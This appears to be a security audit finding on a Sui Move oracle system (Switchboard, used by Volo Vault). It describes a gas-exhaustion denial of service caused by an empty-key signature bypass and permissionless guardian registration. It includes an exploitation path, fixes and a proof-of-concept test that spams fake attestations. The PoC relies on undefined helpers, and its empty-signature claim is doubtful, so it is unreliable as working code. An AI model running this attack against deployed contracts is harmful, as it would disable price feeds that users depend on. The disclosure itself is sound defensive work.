# Audit Report

## Title
Gas Exhaustion DoS via Signature Verification Bypass in Oracle Attestation Mechanism

## Summary
A critical vulnerability in the Switchboard on-demand oracle system allows attackers to bypass signature verification by exploiting how empty vectors are handled in the `check_subvec` function. Combined with permissionless oracle registration and a bug in guardian validation logic, attackers can spam attestations to enabled oracles, causing gas exhaustion that blocks legitimate attestation operations and leads to oracle expiration and protocol-wide denial of service.

## Finding Description

The vulnerability consists of six interrelated root causes that enable a complete bypass of the oracle attestation security mechanism:

**Root Cause 1: Signature Verification Bypass via Empty Vector**

The `check_subvec` utility function returns `true` when the second vector parameter is empty. [1](#0-0)  When `v2.length() == 0`, the function sets `iterations = 0`, the while loop never executes, and returns `true` without performing any byte comparison.

**Root Cause 2: Non-Enabled Guardians Have Empty Keys**

New oracle objects (including guardians) are created with empty `secp256k1_key`. [2](#0-1)  This initialization state allows non-enabled guardians to exist with empty cryptographic keys at line 79.

**Root Cause 3: Permissionless Oracle Registration**

The `oracle_init_action::run` entry function has no authorization check. [3](#0-2)  The validation function only checks queue version and oracle key uniqueness, with no authority verification. [4](#0-3) 

**Root Cause 4: Buggy Guardian Validation**

The attestation validation contains a critical bug. [5](#0-4)  The code checks `oracle.expiration_time_ms()` instead of `guardian.expiration_time_ms()`. Despite the comment stating "check that the guardian is valid" and the error name `EGuardianInvalid`, the code validates the wrong object.

**Root Cause 5: Signature Verification Uses check_subvec with Guardian's Empty Key**

The attestation validation relies on `check_subvec` to verify signatures. [6](#0-5)  When `guardian.secp256k1_key()` returns an empty vector, the assertion always passes regardless of the signature provided.

**Root Cause 6: Expensive Filter Operation**

The `add_attestation` function filters the entire `valid_attestations` vector on each call. [7](#0-6)  With thousands of attestations from different fake guardians, this filter operation consumes excessive gas.

**Exploitation Path:**

1. Attacker calls `oracle_init_action::run` repeatedly to register thousands of fake guardian oracles to the guardian queue (no authorization required)
2. Each fake guardian has empty `secp256k1_key` and `expiration_time_ms = 0`
3. Attacker calls `oracle_attest_action::run` for each fake guardian to attest to an existing enabled oracle
4. The buggy validation passes because it checks the target oracle's expiration instead of the guardian's
5. The signature verification passes because the guardian's `secp256k1_key` is empty
6. Each attestation is added to the oracle's `valid_attestations` vector
7. When legitimate guardians attempt to attest, the `vector::filter!` operation exceeds gas limits
8. Legitimate attestations fail, preventing oracle renewal

## Impact Explanation

**Critical Severity - Protocol-Wide Denial of Service**

The impact cascades through multiple layers:

**Oracle Layer Impact:**
Enabled oracles cannot receive legitimate attestations for renewal, causing them to expire and become unusable.

**Aggregator Layer Impact:**
Switchboard aggregators require valid (non-expired) oracles to submit price updates. [8](#0-7)  Without valid oracles, aggregators cannot receive updates and become stale.

**Volo Vault Impact:**
The Volo Vault depends on Switchboard aggregators for USD price valuations. [9](#0-8)  The `get_current_price` function enforces staleness checks. [10](#0-9)  If the aggregator's price is not updated within the `update_interval` (1 minute by default at line 12), the function reverts. This breaks all vault operations requiring price data.

**Permanence:**
Once an oracle's `valid_attestations` vector is filled with thousands of fake attestations, the gas exhaustion is persistent. All subsequent attestation attempts fail, making the oracle permanently unusable without a protocol upgrade.

While no funds are directly stolen, the operational integrity of the entire oracle infrastructure is completely compromised, blocking critical protocol functionality indefinitely.

## Likelihood Explanation

**High Likelihood - Easily Executable Attack**

**Attacker Capabilities Required:**
- No privileged access required
- No existing guardian control needed
- Only requires standard transaction capabilities

**Attack Complexity:**
- Low - Oracle registration is permissionless via public entry function with no authorization checks
- Signature bypass is trivial due to the empty vector bug
- Only requires calling two entry functions repeatedly
- No complex transaction orchestration required

**Preconditions:**
- At least one oracle must be enabled (normal operational state)
- Attacker needs gas for transactions
- Both conditions are standard in normal protocol operation

**Economic Viability:**
- Attack cost: ~1,000 oracle registrations + attestations Ã— gas per transaction
- Total attack cost is modest (only gas fees) compared to the impact of disabling critical oracle infrastructure
- Attack is persistent - once executed, it blocks legitimate operations until a protocol upgrade
- Cost-benefit ratio strongly favors the attacker

## Recommendation

1. **Add Authorization Check**: Modify `oracle_init_action::validate` to require queue authority permission using `queue.has_authority(ctx)` before allowing oracle registration.

2. **Fix Guardian Validation Bug**: Change line 67 in `oracle_attest_action::validate` from `assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);` to `assert!(guardian.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);`

3. **Validate Non-Empty Keys**: Add a check in `oracle_attest_action::validate` to ensure `guardian.secp256k1_key()` is not empty before signature verification.

4. **Add Attestation Limit**: Implement a maximum limit on the `valid_attestations` vector size to prevent unbounded gas consumption.

5. **Clear Stale Attestations**: Implement a mechanism to remove expired attestations before adding new ones, rather than filtering on every call.

## Proof of Concept

```move
#[test]
fun test_fake_guardian_attestation_dos() {
    use sui::test_scenario;
    use switchboard::oracle_init_action;
    use switchboard::oracle_attest_action;
    use sui::clock;
    
    let owner = @0x1;
    let attacker = @0x999;
    let mut scenario = test_scenario::begin(owner);
    
    // Setup guardian queue and legitimate oracle
    let guardian_queue = setup_guardian_queue(&mut scenario);
    let legitimate_oracle = setup_legitimate_oracle(&mut scenario);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Attacker registers 1000 fake guardians (permissionless)
    test_scenario::next_tx(&mut scenario, attacker);
    let mut i = 0;
    while (i < 1000) {
        let fake_oracle_key = generate_random_key(i);
        oracle_init_action::run(
            fake_oracle_key,
            &mut guardian_queue,
            scenario.ctx()
        );
        i = i + 1;
    };
    
    // Attacker submits fake attestations (all pass due to bugs)
    test_scenario::next_tx(&mut scenario, attacker);
    i = 0;
    while (i < 1000) {
        let fake_guardian = get_fake_guardian(&guardian_queue, i);
        oracle_attest_action::run(
            &mut legitimate_oracle,
            &guardian_queue,
            &fake_guardian,
            clock.timestamp_ms() / 1000,
            vector::empty(), // fake mr_enclave
            vector::empty(), // fake secp256k1_key
            vector::empty(), // fake signature (bypassed)
            &clock,
        );
        i = i + 1;
    };
    
    // Legitimate guardian tries to attest - GAS EXHAUSTION
    test_scenario::next_tx(&mut scenario, owner);
    let legitimate_guardian = get_legitimate_guardian(&guardian_queue);
    // This call will exceed gas limits due to filtering 1000+ attestations
    oracle_attest_action::run(
        &mut legitimate_oracle,
        &guardian_queue,
        &legitimate_guardian,
        clock.timestamp_ms() / 1000,
        legitimate_mr_enclave(),
        legitimate_secp256k1_key(),
        legitimate_signature(),
        &clock,
    ); // FAILS with OUT_OF_GAS
    
    test_scenario::end(scenario);
}
```

### Citations

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/utils/hash.move (L156-171)
```text
public fun check_subvec(v1: &vector<u8>, v2: &vector<u8>, start_idx: u64): bool {
    if (v1.length() < start_idx + v2.length()) {
        return false
    };

    let mut iterations = v2.length();
    while (iterations > 0) {
        let idx = iterations - 1;
        if (v1[start_idx + idx] != v2[idx]) {
            return false
        };
        iterations = iterations - 1;
    };

    true
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/schemas/oracle.move (L65-86)
```text
public(package) fun new(
    oracle_key: vector<u8>,
    queue: ID,
    queue_key: vector<u8>,
    ctx: &mut TxContext,
): ID {
    let id = object::new(ctx);
    let oracle_id = *(id.as_inner());
    let oracle = Oracle {
        id,
        oracle_key,
        queue,
        queue_key,
        expiration_time_ms: 0,
        secp256k1_key: vector::empty(),
        valid_attestations: vector::empty(),
        mr_enclave: vector::empty(),
        version: VERSION,
    };
    transfer::share_object(oracle);
    oracle_id
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/schemas/oracle.move (L100-105)
```text
public(package) fun add_attestation(oracle: &mut Oracle, attestation: Attestation, timestamp_ms: u64) {
    oracle.valid_attestations = vector::filter!(oracle.valid_attestations, |a: &Attestation| {
        a.timestamp_ms + ATTESTATION_TIMEOUT_MS > timestamp_ms && a.guardian_id != attestation.guardian_id
    });
    vector::push_back(&mut oracle.valid_attestations, attestation);
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L20-26)
```text
public fun validate(
    oracle_key: &vector<u8>,
    queue: &Queue,
) {
    assert!(queue.version() == EXPECTED_QUEUE_VERSION, EInvalidQueueVersion);
    assert!(!queue.existing_oracles_contains(*oracle_key), EOracleKeyExists);
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L50-64)
```text
public entry fun run(
    oracle_key: vector<u8>,
    queue: &mut Queue,
    ctx: &mut TxContext
) {   
    validate(
        &oracle_key,
        queue,
    );
    actuate(
        queue,
        oracle_key,
        ctx,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L66-67)
```text
    // check that the guardian is valid
    assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L87-92)
```text
    // recover the guardian pubkey from the signature
    let recovered_pubkey_compressed = ecdsa_k1::secp256k1_ecrecover(&signature, &attestation_msg, 1);
    let recovered_pubkey = ecdsa_k1::decompress_pubkey(&recovered_pubkey_compressed);

    // check that the recovered pubkey is valid
    assert!(hash::check_subvec(&recovered_pubkey, &guardian.secp256k1_key(), 1), EInvalidSignature);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/aggregator/aggregator_submit_result_action.move (L62-63)
```text
    // verify that the oracle is up
    assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EOracleInvalid);
```

**File:** volo-vault/sources/oracle.move (L8-8)
```text
use switchboard::aggregator::Aggregator;
```

**File:** volo-vault/sources/oracle.move (L250-261)
```text
public fun get_current_price(config: &OracleConfig, clock: &Clock, aggregator: &Aggregator): u256 {
    config.check_version();

    let now = clock.timestamp_ms();
    let current_result = aggregator.current_result();

    let max_timestamp = current_result.max_timestamp_ms();

    if (now >= max_timestamp) {
        assert!(now - max_timestamp < config.update_interval, ERR_PRICE_NOT_UPDATED);
    };
    current_result.result().value() as u256
```
